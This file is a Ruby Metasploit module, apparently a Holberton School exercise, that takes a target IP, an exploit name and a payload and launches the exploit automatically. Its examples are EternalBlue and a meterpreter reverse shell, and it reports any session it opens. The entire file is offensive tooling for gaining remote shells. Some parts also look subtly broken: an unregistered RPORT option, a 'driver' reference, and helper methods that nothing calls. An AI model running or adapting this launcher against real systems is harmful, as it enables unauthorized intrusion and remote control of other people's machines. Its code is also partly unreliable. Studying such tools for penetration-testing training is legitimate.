##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Automated Exploit Launcher',
      'Description'    => %q{
        This module automatically launches a chosen exploit against a target system.
        It accepts the target IP, exploit module, and payload as input parameters,
        configures the module to use the specified exploit and payload, and executes it.
        This automation simplifies the process of launching exploits during penetration testing.
      },
      'Author'         => ['Holberton School'],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['URL', 'https://www.metasploit.com']
        ]
    ))

    register_options(
      [
        OptString.new('RHOST', [true, 'The target IP address']),
        OptString.new('EXPLOIT', [true, 'The exploit module to use (e.g., windows/smb/ms17_010_eternalblue)']),
        OptString.new('PAYLOAD', [true, 'The payload to use (e.g., windows/x64/meterpreter/reverse_tcp)']),
        OptString.new('LHOST', [true, 'The local IP address for reverse connection']),
        OptInt.new('LPORT', [true, 'The local port for reverse connection', 4444])
      ])
  end

  def run
    # Retrieve input parameters
    target_ip = datastore['RHOST']
    exploit_name = datastore['EXPLOIT']
    payload_name = datastore['PAYLOAD']
    local_ip = datastore['LHOST']
    local_port = datastore['LPORT']

    # Print configuration
    print_status("Launching exploit #{exploit_name} against #{target_ip} with payload #{payload_name}")
    print_status("Local handler: #{local_ip}:#{local_port}")

    begin
      # Create exploit instance
      exploit = framework.exploits.create(exploit_name)

      if exploit.nil?
        print_error("Failed to load exploit module: #{exploit_name}")
        print_error("Please verify the exploit path is correct")
        return
      end

      # Configure exploit datastore options
      exploit.datastore['RHOST'] = target_ip
      exploit.datastore['RPORT'] = datastore['RPORT'] if datastore['RPORT']

      # Create payload instance
      payload = framework.payloads.create(payload_name)

      if payload.nil?
        print_error("Failed to load payload module: #{payload_name}")
        print_error("Please verify the payload path is correct")
        return
      end

      # Configure payload datastore options
      payload.datastore['LHOST'] = local_ip
      payload.datastore['LPORT'] = local_port

      # Set the payload for the exploit
      exploit.datastore['PAYLOAD'] = payload_name
      exploit.datastore['LHOST'] = local_ip
      exploit.datastore['LPORT'] = local_port

      # Validate options
      print_status("Validating exploit options...")
      exploit.options.validate(exploit.datastore)

      print_status("Validating payload options...")
      payload.options.validate(payload.datastore)

      print_status("Running exploit...")

      # Launch the exploit
      session = exploit.exploit_simple(
        'Payload'        => payload_name,
        'Target'         => 0,
        'LocalInput'     => driver.input,
        'LocalOutput'    => driver.output,
        'RunAsJob'       => false
      )

      # Check if session was created
      if session
        print_good("Exploit completed successfully!")
        print_good("Session #{session.sid} created")

        # Report the successful exploitation
        report_note(
          host: target_ip,
          type: 'exploit.success',
          data: {
            exploit: exploit_name,
            payload: payload_name,
            session_id: session.sid
          }
        )
      else
        print_status("Exploit completed but no session was created")
        print_status("This may be normal for certain exploits or if the target is not vulnerable")
      end

    rescue ::Msf::OptionValidateError => e
      print_error("Option validation failed: #{e.message}")
      print_error("Please check your RHOST, LHOST, and LPORT settings")
    rescue ::Rex::ConnectionError => e
      print_error("Connection failed: #{e.message}")
      print_error("Please verify the target is reachable and the service is running")
    rescue ::Rex::HostUnreachable => e
      print_error("Host unreachable: #{e.message}")
      print_error("Please check network connectivity to #{target_ip}")
    rescue ::Msf::Exploit::Failed => e
      print_error("Exploit failed: #{e.message}")
      print_error("The target may not be vulnerable or exploit requirements not met")
    rescue ::Exception => e
      print_error("Error during exploit execution: #{e.class} - #{e.message}")
      print_error("Backtrace:")
      e.backtrace.first(5).each do |line|
        print_error("  #{line}")
      end
    end
  end

  def exploit_simple_wrapper(exploit, payload_name)
    # This method provides a simplified wrapper for exploit execution
    # It handles the common case of launching an exploit with standard options

    begin
      # Use exploit_simple with enhanced options
      results = exploit.exploit_simple(
        'Payload'        => payload_name,
        'Target'         => exploit.datastore['TARGET'] || 0,
        'LocalInput'     => driver.input,
        'LocalOutput'    => driver.output,
        'RunAsJob'       => false,
        'Options'        => {
          'RHOST' => exploit.datastore['RHOST'],
          'RPORT' => exploit.datastore['RPORT'],
          'LHOST' => exploit.datastore['LHOST'],
          'LPORT' => exploit.datastore['LPORT']
        }
      )

      return results

    rescue ::Exception => e
      print_error("Exploit wrapper error: #{e.message}")
      return nil
    end
  end

  def print_configuration
    # Print current configuration for debugging
    print_line("")
    print_line("=" * 60)
    print_line("Automated Exploit Launcher Configuration")
    print_line("=" * 60)
    print_line("Target IP (RHOST):    #{datastore['RHOST']}")
    print_line("Exploit Module:        #{datastore['EXPLOIT']}")
    print_line("Payload:               #{datastore['PAYLOAD']}")
    print_line("Local IP (LHOST):      #{datastore['LHOST']}")
    print_line("Local Port (LPORT):    #{datastore['LPORT']}")
    print_line("=" * 60)
    print_line("")
  end
end
